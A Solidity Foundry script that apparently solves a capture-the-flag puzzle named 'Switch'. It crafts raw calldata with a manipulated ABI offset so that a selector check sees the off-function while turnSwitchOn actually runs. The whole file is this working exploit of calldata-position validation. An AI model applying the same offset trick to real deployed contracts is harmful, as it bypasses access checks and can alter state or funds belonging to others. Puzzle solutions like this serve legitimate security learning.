// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import "forge-std/Test.sol";

import {Switch} from "src/Switch.sol";

contract SwitchScript is Script, Test {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);

        Switch sw = Switch(0x331F4cF6173dbe1f8b08C05baF0aCc7f18419E32);
        address(sw).call(
            abi.encodePacked(
                sw.flipSwitch.selector, abi.encode(0x60, 4, sw.offSelector(), 4, Switch.turnSwitchOn.selector)
            )
        );
        assertTrue(sw.switchOn());

        vm.stopBroadcast();
    }
}
